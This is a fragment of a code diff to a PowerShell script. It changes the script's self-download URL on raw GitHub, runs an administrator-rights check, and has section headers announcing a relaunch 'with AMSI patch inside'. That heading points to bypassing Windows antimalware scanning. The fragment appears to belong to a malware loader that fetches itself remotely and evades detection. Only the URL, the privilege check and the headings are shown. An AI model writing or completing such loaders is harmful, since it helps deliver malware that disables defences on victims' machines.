@@ -9,7 +9,7 @@ try {
 } catch {}
 
 # ===== 3. SELF-URL + ADMIN CHECK =====
-$self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"
+$self = "https://github.com/analysisw/test/raw/refs/heads/main/teest.ps1"
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 # ===== 4. RELAUNCH TARGET with AMSI patch inside =====
